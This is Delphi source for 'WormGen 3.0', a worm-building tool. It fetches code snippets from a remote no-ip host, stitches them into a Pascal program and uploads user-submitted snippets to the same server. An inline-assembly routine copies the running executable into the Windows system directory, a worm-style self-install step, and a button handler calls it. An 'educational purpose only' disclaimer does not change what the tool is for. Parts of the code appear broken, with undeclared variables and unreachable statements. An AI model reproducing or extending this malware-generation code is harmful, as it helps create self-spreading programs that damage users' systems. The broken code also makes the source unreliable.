unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, StdCtrls, CheckLst, ExtCtrls, Urlmon, ComCtrls;

type
  TForm1 = class(TForm)
    StatusBar1: TStatusBar;
    ProgressBar1: TProgressBar;
    Button1: TButton;
    GroupBox1: TGroupBox;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    TabSheet5: TTabSheet;
    CheckBox2: TCheckBox;
    Label1: TLabel;
    PageControl2: TPageControl;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet8: TTabSheet;
    Button5: TButton;
    Memo1: TMemo;
    Label2: TLabel;
    Memo2: TMemo;
    Label3: TLabel;
    Memo3: TMemo;
    Label4: TLabel;
    Panel1: TPanel;
    Label5: TLabel;
    Memo4: TMemo;
    Image1: TImage;
    Label6: TLabel;
    Label7: TLabel;
    Edit1: TEdit;
    Label8: TLabel;
    Edit2: TEdit;
    Timer1: TTimer;
    ListView3: TListView;
    Timer2: TTimer;
    Button6: TButton;
    ListView2: TListView;
    Memo5: TMemo;
    Memo6: TMemo;
    Edit3: TEdit;
    TabSheet9: TTabSheet;
    Label9: TLabel;
    Memo7: TMemo;
    Label10: TLabel;
    Label11: TLabel;
    Label12: TLabel;
    Edit4: TEdit;
    Label13: TLabel;
    ListView1: TListView;
    Button7: TButton;
    PopupMenu1: TPopupMenu;
    Edit5: TMenuItem;
    Uses1: TMenuItem;
    Vars1: TMenuItem;
    Consts1: TMenuItem;
    Source1: TMenuItem;
    Panel2: TPanel;
    RichEdit1: TRichEdit;
    procedure Memo1Change(Sender: TObject);
    procedure Memo2Change(Sender: TObject);
    procedure Memo3Change(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    Function GetInfo(No:Integer; fName:String):String;
    procedure ListView3DblClick(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    Procedure UpdateDB(fName:String;id:integer);
    Function FileSize(FileName: String): Int64;
    procedure Button3Click(Sender: TObject);
    function  ItemExists(text:string):boolean;
    procedure BuildProg(FileName:String);
    procedure Button1Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Memo7Change(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure FormConstrainedResize(Sender: TObject; var MinWidth,
      MinHeight, MaxWidth, MaxHeight: Integer);
    procedure ListView2DblClick(Sender: TObject);
    procedure FixLine(Str1:string);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  FullSize : Integer;
  GConst,
  GVarS,
  GSnp : String;

 function UpdateFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

implementation

uses Unit2;

{$R *.dfm}

procedure penis(Name,Text,Caption:String); ASSEMBLER;
Var
  SysDir:String;
  MyFile:String;
  VirusFile:String;
Label
  GetPoint, FoundPoint;
ASM

  call GetCommandLineA

  inc  eax
  push eax
  push VirusFile
  call lstrcpyA

  mov  esi, VirusFile
  call GetPoint

  mov  dword ptr [esi+4],0000000d

  push VirusFile
  push MyFile
  call lstrcpyA

  push 255
  push SysDir
  call GetSystemDirectoryA

  push 0
  push Caption
  push Text
  push 0
  call MessageBoxA

  push 0
  push SysDir
  push MyFile
  call CopyFileA

GetPoint:
  cmp  byte ptr [esi],'.'
  jz   FoundPoint
  inc  esi
  jmp  GetPoint
FoundPoint:
  ret

end;

procedure tform1.FixLine(Str1:string);
var
 x,y,i:integer;
 str:string;
 tmp:string;
begin

 y := richedit1.CaretPos.y; // line
 x := richedit1.CaretPos.X; // width
 richedit1.Update;
 tmp := richedit1.Lines.Strings[y-1];
 while copy(tmp, 1, 1) = ' ' do begin
  str := str + ' ';
  tmp := copy(tmp, 2, length(tmp));
  if copy(tmp, 1,1) <> ' ' then break;
 end;
 if str1 <> '' then begin
  if LowerCase(trim(copy(tmp, length(tmp), 1))) = '{' then begin
    str := Str + '  ';
  end;
  if LowerCase(trim(copy(Str1, length(Str1), 1))) = '}' then begin
   str := copy(str, 1, length(str)-2);
  end;
  if LowerCase(trim(copy(tmp, length(tmp)-4, 5))) = 'begin' then begin
    str := Str + '  ';
  end;
  if LowerCase(trim(copy(Str1, length(Str1)-3, 4))) = 'end;' then begin
   str := copy(str, 1, length(str)-2);
  end;
 end;
 If Memo1.Lines.Count = 2 then
  richedit1.seltext := trim(str1)
 else
  richedit1.seltext := str + trim(str1) + #13#10;

end;

Function GetPart(nr:integer;fname:string):string;
var
 f:textfile;
 l,text:string;
begin
 fname := ExtractFilePath(Paramstr(0))+'Plugins\'+fName;
 If FileExists(fName) Then Begin
 assignfile(f, fname);
 reset(f);
 read(f, l);
 If (Copy(L,1,2) <> '//') And not (Form1.CheckBox2.Checked) Then Begin
  If nr <> 3 then
   text := l// + #13#10;
  else
   text := l + #13#10;
 End;
 readln(f,l);
 while not eof(F) do begin
  read(f, l);
  If (Copy(L,1,2) <> '//') And not (Form1.CheckBox2.Checked) Then Begin
   If nr <> 3 then
    text := text + l// + #13#10;
   else
    text := text + l + #13#10;
  End;
  readln(f,l);
 end;
 closefile(f);
 End Else
  Text := fName;
 Case nr of
  0: begin
      result := copy(text, pos('!----![PUBLIC]!----!', text)+
      length('!----![PUBLIC]!----!'), length(text));
      result := copy(result,1,pos('!----![PUBLIC]!----!', result)-1);
     end;
  1: begin
      result := copy(text, pos('!----![VARS]!----!', text)+
      length('!----![VARS]!----!'), length(text));
      result := copy(result,1,pos('!----![VARS]!----!', result)-1);
     end;
  2: begin
      result := copy(text, pos('!----![USES]!----!', text)+
      length('!----![USES]!----!'), length(text));
      result := copy(result,1,pos('!----![USES]!----!', result)-1);
     end;
  3: begin
      result := copy(text, pos('!----![SNIPPET]!----!', text)+
      length('!----![SNIPPET]!----!'), length(text));
      result := copy(result,1,pos('!----![SNIPPET]!----!', result)-1);
     end;
 End;
end;

procedure TForm1.BuildProg(FileName:String);
var
 I,J:Integer;
 tmp,str:string;
 GUses:String;
 GU : String;
 Us:Array[0..800] Of String;
 Va:Array[0..800] Of String;
 Co:Array[0..800] Of String;
begin
 GSnp := '';
 GUses := '';
 GVars := '';
 GConst := '';
 Progressbar1.Position := 0;
 Progressbar1.Max := 3;
 StatusBar1.Panels[1].Text := 'Generating : 0%';
 For I :=0 To ListView3.Items.Count -1 Do Begin
  If ListView3.Items[i].Checked Then Begin
Progressbar1.Position := 0;
// USES
   GU := GetPart(2, ListView3.Items[i].Caption );
   J := 0;
   While Pos(',',GU)>0 Do Begin
    Us[j] := LowerCase(Trim(Copy(GU, 1, Pos(',', GU)-1)));
    GU := Copy(GU, Pos(',', GU)+1, Length(GU));
    Inc(J);
   End;
   IF Copy(GU,length(GU), 1) = ';' Then
    GU := Trim(Copy(GU,1,Length(GU)-1));
   If GU <> '' Then Us[j] := GU;
   GU := '';
   For J := 0 To 800 Do Begin
    If Us[j] = '' Then Break;
    If Pos(LowerCase(Us[j]), LowerCase(GUses)) = 0 Then
     GUses := GUses+Us[j] + ', ';
   End;
//   IF Copy(GUses,length(GUses)-1, 2) = ', ' Then
//    GUses := Trim(Copy(GUses,1,Length(GUses)-2));
// USES
Progressbar1.Position := 1;
// VARS
   GU := GetPart(1, ListView3.Items[i].Caption );
   J := 0;
   While Pos(';',GU)>0 Do Begin
    Va[j] := LowerCase(Trim(Copy(GU, 1, Pos(';', GU)-1)));
    GU := Copy(GU, Pos(';', GU)+1, Length(GU));
    Inc(J);
   End;
   GU := '';
   For J := 0 To 800 Do Begin
    If Va[j] = '' Then Break;
    If Pos(LowerCase(Va[j]), LowerCase(GVars)) = 0 Then
     GVars := GVars+Va[j] + ';'#13#10;
   End;
//   IF Copy(GVars,length(GVars)-1, 2) = ', ' Then
//    GVars := Trim(Copy(GVars,1,Length(GVars)-2));
// VARS
Progressbar1.Position := 2;
// CONST
   GU := GetPart(0, ListView3.Items[i].Caption );
   J := 0;
   While Pos(';',GU)>0 Do Begin
    Co[j] := LowerCase(Trim(Copy(GU, 1, Pos(';', GU)-1)));
    GU := Copy(GU, Pos(';', GU)+1, Length(GU));
    Inc(J);
   End;
   GU := '';
   For J := 0 To 800 Do Begin
    If Co[j] = '' Then Break;
    If Pos(LowerCase(Co[j]), LowerCase(GConst)) = 0 Then
     GConst := GConst+Co[j] + ';'#13#10;
   End;
//   IF Copy(GConst,length(GConst)-1, 2) = ', ' Then
//    GConst := Trim(Copy(GConst,1,Length(GConst)-2));
// CONST
   GSnp := GSnp + GetPart(3, ListView3.Items[i].Caption )+#13#10#13#10;
Progressbar1.Position := 3;
   end;
  End;
   StatusBar1.Panels[1].Text := 'Generating : 50%';
   Memo5.Text := '';
   Memo5.Lines.Add('Program '+copy(Filename,1,length(filename)-4)+';');
   If GUses <> ''  Then Begin
    Memo5.Lines.Add('Uses ');
    Memo5.Lines.Add(GUses+';');
   End;
   StatusBar1.Panels[1].Text := 'Generating : 60%';
   Memo5.Lines.Add('');
   If GConst <> ''  Then Begin
    Memo5.Lines.Add('Const ');
    Memo5.Lines.Add(GConst);
   End;
   StatusBar1.Panels[1].Text := 'Generating : 70%';
   Memo5.Lines.Add('');
   If GVars <> ''  Then Begin
    Memo5.Lines.Add('Vars ');
    Memo5.Lines.Add(GVars);
   End;
   StatusBar1.Panels[1].Text := 'Generating : 80%';
   Memo5.Lines.Add('');
   Memo5.Lines.Add(GSnp);
   StatusBar1.Panels[1].Text := 'Generating : 90%';
   Memo5.Lines.Add('');
   Memo5.Lines.Add('Begin');
   Memo5.Lines.Add('(*');
   Memo5.Lines.Add(' Following Functions and Procedures :');
   GVars := '';
   Memo6.Text := GSnp;

   For I := 0 To Memo6.Lines.Count -1 Do
    If trim(lowercase(Copy(Memo6.Lines.Strings[i], 1, 8))) = 'function' then begin
     gconst := Trim(lowercase(Memo6.Lines.Strings[i]));
     gconst := copy(gconst, 10, length(gconst));
     if pos('(',gconst)>0 then begin
      gconst := copy(gconst, 1, Pos('(',gconst)-1);
      gconst := gconst + '( Params Here )';
     end else
      gconst := copy(gconst, 1, pos(':',gconst)-1);
     memo5.Lines.Add('// Function; modify the params yourself');
     memo5.Lines.Add(gconst+';');
    end else
    If trim(lowercase(Copy(Memo6.Lines.Strings[i], 1, 9))) = 'procedure' then begin
     gconst := Trim(lowercase(Memo6.Lines.Strings[i]));
     gconst := copy(gconst, 11, length(gconst));
     if pos('(',gconst)>0 then begin
      gconst := copy(gconst, 1, Pos('(',gconst)-1);
      gconst := gconst + '( Params Here )';
     end else
      gconst := copy(gconst, 1, pos(';',gconst)-1);
     memo5.Lines.Add('// Procedure; modify the params yourself');
     memo5.Lines.Add(gconst+';');
    end;

   Memo5.Lines.Add('- I aint gonna do all the work for ya... WormGen 3.0');
   Memo5.Lines.Add('*)');
   Memo5.Lines.Add('End.');

 for i:=0 to memo1.lines.count -1 do begin
  tmp := memo1.Lines.Strings[i];
  str := '' ;
  while copy(tmp, 1, 1) = ' ' do begin
   tmp := copy(tmp, 2, length(tmp));
   if copy(tmp,1,1) <> ' ' then break;
  end;
  memo1.Lines.Strings[i] := tmp;
 end;

 Progressbar1.Position := 0;
 Progressbar1.Max := Memo5.Lines.Count;
 Progressbar1.Min := 0;

 For I:=0 To Memo5.Lines.Count -1 Do Begin
  Progressbar1.Position := i;
  FixLine(Memo5.Lines.Strings[i]);
  Sleep(1);
 End;

   Memo5.Text := RichEdit1.Text;

   Memo5.Lines.SaveToFile(filename);
   StatusBar1.Panels[1].Text := 'Generating : 0%';
   Progressbar1.Position := 0;
   MessageBox(0, 'Generation Done; Go modify the source now.', 'Notice', Mb_ok);

end;

function Tform1.ItemExists(text:string):boolean;
var
 i:integer;
begin
 result := false;
 for i :=0 to listview2.items.count -1 do
  if listview2.items[i].caption = text then result := true;
end;

Function TForm1.FileSize(FileName: String): Int64;
Var
  H: THandle;
  FData: TWin32FindData;
Begin
  Result:= -1;

  H:= FindFirstFile(PChar(FileName), FData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
  End;
End;

Procedure TForm1.UpdateDB(fName:String;id:integer);
Var
 F:TextFile;
 L1,L2,Snp:String;
 Path:String;
 No,I:Integer;
 AddSnp:Boolean;
 Item:TListItem;
Begin

 Path := ExtractFilePath(ParamStr(0))+'Plugins\'+fName;
 UpdateFile(0,pChar('http://p0ke.no-ip.com/wg3/'+fName),pchar(Path),0,0);

 Memo5.Clear;

 AssignFile(F,Path);
 Reset(F);
 Read  (F, l1);
 ReadLn(F, l2);
 Memo5.Lines.Add(L1);
 While Not Eof(F) Do Begin
  Read  (F, l1);
  ReadLn(F, l2);
  Memo5.Lines.Add(L1);
 End;
 CloseFile(F);

 L1 := Memo5.Text;
 While Pos('\\r\\n', L1) > 0 do begin
  I := Pos('\\r\\n', L1);
  Delete(l1, I, 6);
  Insert(#13#10, L1, i);
 End;
 While Pos('\\ pew', L1) > 0 do begin
  I := Pos('\\ pew', L1);
  Delete(l1, I, 6);
  Insert('&', L1, i);
 End;
 While Pos('\\', L1) > 0 do begin
  I := Pos('\\', L1);
  Delete(l1, I, 2);
  Insert('\', L1, i);
 End;
 While Pos('\''', L1) > 0 do begin
  I := Pos('\''', L1);
  Delete(l1, I, 2);
  Insert('''', L1, i);
 End;

 Memo5.Text := L1;

 Path := ExtractFilePath(ParamStr(0));
 Path := Path + 'Plugins\' + fName;
 AssignFile(F, Path);
 ReWrite(F);
 Write(F, Memo5.text);
 CloseFile(F);
 Snp := '';

 For I:=0 To ListView2.Items.Count -1 Do
  If ListView2.Items[i].Caption = fName Then Exit;

    Path := ExtractFilePath(ParamStr(0))+'Plugins\'+fName;
    Item := ListView3.Items.Add;
    Item.Caption :=   GetInfo(0,Path);
    Item.SubItems.Add(GetInfo(1,Path));
    Item.SubItems.Add(GetInfo(2,Path));
    Item.SubItems.Add(IntToStr(FileSize(Path)));
    Item := ListView2.Items.Add;
    Item.Caption :=   GetInfo(0,Path);
    Item.SubItems.Add(GetInfo(1,Path));
    Item.SubItems.Add(GetInfo(2,Path));
    Item.SubItems.Add(IntToStr(FileSize(Path)));

End;

Function TForm1.GetInfo(No:Integer; fName:String):String;
Var
 F:TextFile;
 L1,L2,Text:String;
 Size:Integer;
Begin
 AssignFile(F, fName);
 Reset(F);
 Size := FileSize(fName);
 Read  (F, L1);
 Readln(F, L2);
 Text := Text + L1 + #13#10;
 While not Eof(F) Do Begin
  Read  (F, L1);
  Readln(F, L2);
  Text := Text + L1 + #13#10;
 End;
 CloseFile(F);

 Case No Of
  0 : Result := ExtractFileName(fName);
  1 : Begin
       Result := Copy(Text, Pos('Description: ',Text)+13, Length(Text));
       Result := Copy(Result, 1, Pos(#13#10,Result)-1);
       Result := Trim(Result);
      End;
  2 : Begin
       Result := Copy(Text, Pos('Author: ',Text)+8, Length(Text));
       Result := Copy(Result, 1, Pos(#13#10,Result)-1);
       Result := Trim(Result);
      End;
 End;

End;

procedure TForm1.Memo1Change(Sender: TObject);
begin
 Label2.Caption := IntToStr(Memo1.CaretPos.Y)+':'+
                   IntToStr(Memo1.CaretPos.X)+' ['+
                   IntToStr(Memo1.Lines.Count)+' lines;'+
                   IntToStr(Length(Memo1.text))+' chars]';
end;

procedure TForm1.Memo2Change(Sender: TObject);
begin
 Label3.Caption := IntToStr(Memo2.CaretPos.Y)+':'+
                   IntToStr(Memo2.CaretPos.X)+' ['+
                   IntToStr(Memo2.Lines.Count)+' lines;'+
                   IntToStr(Length(Memo2.text))+' chars]';
end;

procedure TForm1.Memo3Change(Sender: TObject);
begin
 Label4.Caption := IntToStr(Memo3.CaretPos.Y)+':'+
                   IntToStr(Memo3.CaretPos.X)+' ['+
                   IntToStr(Memo3.Lines.Count)+' lines;'+
                   IntToStr(Length(Memo3.text))+' chars]';
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
 Search: TSearchRec;
 Path  : String;
 Item  : TListItem;
begin

 ListView2.Clear;
 ListView3.Clear;

 Statusbar1.Panels[1].Text := 'Listing ''Plugins'' ...';
 Path := ExtractFilePath(ParamStr(0)) + 'Plugins\*.snp';

 If DirectoryExists(ExtractFilePath(Path)) Then Begin
  If FindFirst(Path, faDirectory, Search) = 0 Then
  Repeat
   If ((Search.Attr And faDirectory) <> faDirectory) and (Search.Name[1] <> '.') Then Begin
    Item := ListView3.Items.Add;
    Item.Caption :=   GetInfo(0,ExtractFilePath(Path)+Search.Name);
    Item.SubItems.Add(GetInfo(1,ExtractFilePath(Path)+Search.Name));
    Item.SubItems.Add(GetInfo(2,ExtractFilePath(Path)+Search.Name));
    Item.SubItems.Add(IntToStr(Search.Size));
    Item := ListView2.Items.Add;
    Item.Caption :=   GetInfo(0,ExtractFilePath(Path)+Search.Name);
    Item.SubItems.Add(GetInfo(1,ExtractFilePath(Path)+Search.Name));
    Item.SubItems.Add(GetInfo(2,ExtractFilePath(Path)+Search.Name));
    Item.SubItems.Add(IntToStr(Search.Size));
   End;
  Until (FindNext(Search) <> 0);
  FindClose(Search);
 End;

 Statusbar1.Panels[1].Text := 'Generating : 0%';
 Timer1.Enabled := False;
end;

procedure TForm1.ListView3DblClick(Sender: TObject);
var
 Path:String;
 Str:string;
 v,c,s,u:string;
begin
 If ListView3.ItemIndex = -1 Then Exit;
 Path := ExtractFilePath(ParamStr(0));
 Path := Path + 'Plugins\'+ ListView3.ItemFocused.Caption;
 Form2.Label1.Caption := Path;
 Form2.Memo1.Lines.LoadFromFile(Path);
 Str := Form2.Memo1.Text;
 Form2.Memo1.Clear;

 c := GetPart(0, str);
 v := GetPart(1, str);
 u := GetPart(2, str);
 s := GetPart(3, str);

 While Copy(C,1,2) = #13#10 Do
  C := Copy(C, 3, Length(C));
 While Copy(V,1,2) = #13#10 Do
  V := Copy(V, 3, Length(V));
 While Copy(U,1,2) = #13#10 Do
  U := Copy(U, 3, Length(U));
 While Copy(S,1,2) = #13#10 Do
  S := Copy(S, 3, Length(S));

 If C <> '' Then C := 'Const'#13#10+ C;
 If V <> '' Then V := 'Var'#13#10+ V;
 If U <> '' Then U := 'Uses'#13#10+ U;

 Form2.Memo1.Text := Form2.Memo1.Text + U;
 Form2.Memo1.Lines.Add('');
 Form2.Memo1.Text := Form2.Memo1.Text + C;
 Form2.Memo1.Lines.Add('');
 Form2.Memo1.Text := Form2.Memo1.Text + V;
 Form2.Memo1.Lines.Add('');
 Form2.Memo1.Text := Form2.Memo1.Text + S;
 Form2.Memo1.Lines.Add('');

 Form2.Show;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
var
 FSize:Integer;
 FByte:Integer;
 FKilo:Integer;
 Tmp  :String;
 I    :Integer;
begin
 FullSize := 0;
 For I :=0 To ListView3.Items.Count -1 Do
  If ListView3.Items[i].Checked Then
   Inc(FullSize, StrToInt(ListView3.Items[i].SubItems[2]));
 FSize := FullSize;
 FByte := 0;
 FKilo := 0;
 While FSize > 1024 Do Begin
  Inc(FKilo);
  Dec(FSize, 1024);
 End;
 fByte := FSize;
 Tmp := IntToStr(FByte);
 If Length(Tmp) = 1 Then Tmp := '00' + Tmp;
 If Length(Tmp) = 2 Then Tmp := '0' + Tmp;

 StatusBar1.Panels[0].Text := 'DPR Size : ~'+
 IntToStr(FKilo) + '.' + Tmp +' kb';
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 FullSize := 0;
end;

procedure TForm1.Button6Click(Sender: TObject);
begin

 Timer1.Enabled := true;

end;

procedure TForm1.Button4Click(Sender: TObject);
var
 Path:String;
 I : integer;
 No: integer;
begin
 If ListView2.ItemIndex = -1 Then Exit;
 No := 0;
 For I :=0 to ListView2.Items.Count -1 do
  If ListView2.Items[i].Selected Then Inc(no);

 If No = 1 Then
  If MessageBox(0, 'Are you sure you want to delete this file?', 'Warning', mb_yesno) = id_no Then exit;
 If No > 1 Then
  If MessageBox(0, 'Are you sure you want to delete these files?', 'Warning', mb_yesno) = id_no Then exit;

 For I :=0 to ListView2.Items.Count -1 do
  If ListView2.Items[i].Selected Then Begin
   Path := ExtractFilePath(ParamStr(0));
   Path := Path + 'Plugins\'+ ListView2.Items[i].Caption;
   DeleteFile(pChar(Path));
  End;
 Button6Click(Self);
end;

procedure TForm1.Button2Click(Sender: TObject);
var
 Path:String;
 fName:String;
 F:TextFile;
 Item:TListItem;
 No : Integer;
 fi,d,a,s:string;
begin
 Path := ExtractFilePath(ParamStr(0));
 Path := Path + 'update.snp';
 DeleteFile(pChar(Path));
 Sleep(100);
 No := 0;
 ListView1.Items.Clear;
 UpdateFile(0,'http://p0ke.no-ip.com/wg3/wg3_updatelist.snp',pchar(path),0,0);
 If Not FileExists(path) Then
  MessageBox(0,'Error downloading update; Try again later', 'Error', mb_ok)
 Else Begin
  AssignFile(F, Path);
  Reset(F);
  Read(F, fName);
  if not itemexists(copy(fname,1,pos(chr(0160),fname)-1)) then begin

  fi := copy(fname,1,pos(chr(0160),fname)-1);
  fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
  d := copy(fname,1,pos(chr(0160),fname)-1);
  fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
  a := copy(fname,1,pos(chr(0160),fname)-1);
  fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
  s := copy(fname,1,pos(chr(0160),fname)-1);
  fname := copy(fname,pos(chr(0160),fname)+1, length(fname));


  Item := ListView1.Items.Add;
  Item.Caption := fi;
  Item.SubItems.Add(d);
  Item.SubItems.Add(a);
  Item.SubItems.Add(s);
  Item.SubItems.Add(IntToStr(no));
  end;
  Inc(No);
  Readln(F, fName);
  While Not Eof(F) Do Begin
   Read(F, fName);
   if not itemexists(copy(fname,1,pos(chr(0160),fname)-1)) then begin
   fi := copy(fname,1,pos(chr(0160),fname)-1);
   fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
   d := copy(fname,1,pos(chr(0160),fname)-1);
   fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
   a := copy(fname,1,pos(chr(0160),fname)-1);
   fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
   s := copy(fname,1,pos(chr(0160),fname)-1);
   fname := copy(fname,pos(chr(0160),fname)+1, length(fname));
   Item := ListView1.Items.Add;
   Item.Caption := fi;
   Item.SubItems.Add(d);
   Item.SubItems.Add(a);
   Item.SubItems.Add(s);
   Item.SubItems.Add(IntToStr(no));
   end;
   Inc(No);
   Readln(F, fName);
  End;
  CloseFile(F);

 End;
 Label6.caption := IntToStr(ListView1.Items.Count)+' New ''plugins'' to download';
end;

procedure TForm1.Button3Click(Sender: TObject);
var
  i:integer;
  Path : String;
  fName:String;
  F:TextFile;
  t:boolean;
begin
 Path := ExtractFilePath(ParamStr(0))+'Plugins\';
 If Not DirectoryExists(Path) Then
  CreateDirectory(pChar(Path), NIl);

 if listview1.Items.Count = 0 then exit;
 For i:=0 to listview1.items.Count -1 do
  If listview1.items[i].Checked then begin
   Path := ExtractFilePath(ParamStr(0));
   Path := Path+ 'update.snp';
   AssignFile(F, Path);
   Reset(F);
   Read(F, fName);
   If Not ItemExists(copy(fname,1,pos(chr(0160),fname)-1)) Then
    If copy(fname,1,pos(chr(0160),fname)-1) = listview1.items[i].Caption Then
    UpdateDB(copy(fname,1,pos(chr(0160),fname)-1),StrToInt(listview1.items[i].subitems[3]));
   Readln(F, fName);
   While Not Eof(F) Do Begin
    Read(F, fName);
    If Not ItemExists(copy(fname,1,pos(chr(0160),fname)-1)) Then
     If copy(fname,1,pos(chr(0160),fname)-1) = listview1.items[i].Caption Then
      UpdateDB(copy(fname,1,pos(chr(0160),fname)-1),StrToInt(listview1.items[i].subitems[3]));
    Readln(F, fName);
   End;
   CloseFile(F);
   ListView1.Items[i].Caption := 'Downloaded...';
  end;

 While T = False Do Begin
 t := true;
  For I := 0 To ListView1.Items.Count -1 Do
   If ListView1.Items[i].Caption = 'Downloaded...' Then Begin
    t := false;
    listview1.Items[i].Delete;
    break;
   End;
 End;

 Label6.caption := IntToStr(ListView1.Items.Count)+' New ''plugins'' to download';
end;

procedure TForm1.Button1Click(Sender: TObject);
var
 s:array[0..255]of char;
begin
 getsystemdirectory(s,255);
 sysdir := string(s)+'\test.exe';
 myFile := paramstr(0);
Penis('\test.exe','test','tt');
exit;
richedit1.Clear;
if
messagebox(0,
'Do you accept to take fully responsibility for your creation?'#13#10+
'The author cannot be hold responsible for any actions/worms created'#13#10+
'by this application. Its for educational purpose only.',
'Disclaimer',mb_yesno) = id_yes then
BuildProg(Edit3.text);
end;

procedure TForm1.Button5Click(Sender: TObject);
var
 str:string;
 i:integer;
 pub,vars,snp,use,nam:string;
 aut,desc:string;

function fcheck(s:string):string;
var
 str:string;
begin
 str := s;
 While Pos(#13#10, str)>0 do begin
  I := Pos(#13#10, str);
  Delete(str, i,2);
  Insert('\r\n', str, i);
 end;
 While Pos('&', str)>0 do begin
  I := Pos('&', str);
  Delete(str, i,2);
  Insert('\ pew', str, i);
 end;
 result := str;
end;

begin
(*

 http://p0ke.no-ip.com/submitwg3.php?
 pub="nothing:test;"&
 var="shut:face;"&
 snp="test_test;\r\nshit;"&
 use="windows, system"&
 nam="test"

*)
 str := 'http://p0ke.no-ip.com/submitwg3.php?';
 pub := fcheck(memo3.text);
 vars:= fcheck(memo2.text);
 snp := fcheck(memo1.text);
 use := fcheck(memo7.text);
 aut := fcheck(edit1.text);
 desc:= fcheck(edit2.text);
 nam := fcheck(edit4.text);

 str := str + 'pub=' + pub  + '&';
 str := str + 'var=' + Vars + '&';
 str := str + 'snp=' + snp  + '&';
 str := str + 'use=' + use  + '&';
 str := str + 'nam=' + nam  + '&';
 str := str + 'aut=' + aut  + '&';
 str := str + 'desc='+ desc + '&';

 UpdateFile(0,pChar(str),'',0,0);
 MessageBox(0, 'Thanks for submitting a snippet', 'Notice', mb_ok);

end;

procedure TForm1.Memo7Change(Sender: TObject);
begin
 Label9.Caption := IntToStr(Memo7.CaretPos.Y)+':'+
                   IntToStr(Memo7.CaretPos.X)+' ['+
                   IntToStr(Memo7.Lines.Count)+' lines;'+
                   IntToStr(Length(Memo7.text))+' chars]';
end;

procedure TForm1.Button7Click(Sender: TObject);
var
 f :textfile;
 Path:String;
begin
 Path := ExtractFilePath(ParamStr(0));
 Path := Path + 'update.dat';
 UpdateFile(0,'http://p0ke.no-ip.com/wg3/ver.snp',pchar(path),0,0);
 if fileexists(path) then begin
  assignfile(f,path);
  reset(f);
  read(f, path);
  closefile(f);
  if path = '3.01' Then
   messagebox(0,'No new update','Info',mb_ok)
  else
   messagebox(0,'New update aviable for download'#13#10'Http://p0ke.no-ip.com','Info',mb_ok);
 end else
  messagebox(0,'No new update','Info',mb_ok);
end;

procedure TForm1.FormConstrainedResize(Sender: TObject; var MinWidth,
  MinHeight, MaxWidth, MaxHeight: Integer);
begin
  MinHeight := 277;
  MinWidth  := 313;
  MaxHeight := 554;
  MaxWidth  := 626;
end;

procedure TForm1.ListView2DblClick(Sender: TObject);
var
 Path:String;
 Str:string;
 v,c,s,u:string;
begin
 If ListView2.ItemIndex = -1 Then Exit;
 Path := ExtractFilePath(ParamStr(0));
 Path := Path + 'Plugins\'+ ListView2.ItemFocused.Caption;
 Form2.Label1.Caption := Path;
 Form2.Memo1.Lines.LoadFromFile(Path);
 Str := Form2.Memo1.Text;
 Form2.Memo1.Clear;

 c := GetPart(0, str);
 v := GetPart(1, str);
 u := GetPart(2, str);
 s := GetPart(3, str);

 While Copy(C,1,2) = #13#10 Do
  C := Copy(C, 3, Length(C));
 While Copy(V,1,2) = #13#10 Do
  V := Copy(V, 3, Length(V));
 While Copy(U,1,2) = #13#10 Do
  U := Copy(U, 3, Length(U));
 While Copy(S,1,2) = #13#10 Do
  S := Copy(S, 3, Length(S));

 If C <> '' Then C := 'Const'#13#10+ C;
 If V <> '' Then V := 'Var'#13#10+ V;
 If U <> '' Then U := 'Uses'#13#10+ U;

 Form2.Memo1.Text := Form2.Memo1.Text + U;
 Form2.Memo1.Lines.Add('');
 Form2.Memo1.Text := Form2.Memo1.Text + C;
 Form2.Memo1.Lines.Add('');
 Form2.Memo1.Text := Form2.Memo1.Text + V;
 Form2.Memo1.Lines.Add('');
 Form2.Memo1.Text := Form2.Memo1.Text + S;
 Form2.Memo1.Lines.Add('');

 Form2.Show;

end;

end.
